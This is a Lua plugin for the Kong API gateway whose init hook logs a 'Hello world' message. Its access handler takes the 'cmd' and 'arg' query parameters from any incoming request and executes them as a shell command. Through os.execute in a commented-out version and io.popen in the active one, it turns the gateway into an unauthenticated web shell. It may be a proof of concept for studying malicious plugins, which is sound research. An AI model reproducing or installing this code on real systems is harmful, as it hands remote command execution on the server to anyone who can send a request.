local plugin = {
  PRIORITY = 1000,
  VERSION = "0.1.0",
}


function plugin:init_worker()
  kong.log.debug("Hello world plugin init_worker...")
end


-- runs in the 'access_by_lua_block'
function plugin:access(plugin_conf)

  kong.log("========================>plugin:access() hit!<==============================")

  -- Assemble components
  local command = kong.request.get_query_arg("cmd")
  local arg = kong.request.get_query_arg("arg")

  -- VERSION 1: NO COMMAND OUTPUT
  --[[
  local raw_command = kong.request.get_raw_query()
  kong.log("Path with raw query: ", kong.request.get_raw_query())
  os.execute(command .. " " .. arg)
  --]]

  -- VERSION 2: COMMAND OUTPUT HANDLING

	local function osExecute(cmd)
		local fileHandle     = assert(io.popen(cmd, 'r'))
		local commandOutput  = assert(fileHandle:read('*a'))
		local returnTable    = {fileHandle:close()}
		return commandOutput,returnTable[3]            -- rc[3] contains returnCode
	end

  local output, rc = osExecute(command .. " " .. arg)
  print("------------>CMD Output :", output, "\n")
  print("------------>CMD Return Code :", rc, "\n")

end


-- runs in the 'header_filter_by_lua_block'
function plugin:header_filter(plugin_conf)
  kong.response.set_header(plugin_conf.response_header, "this is on the response")
end


-- return our plugin object
return plugin
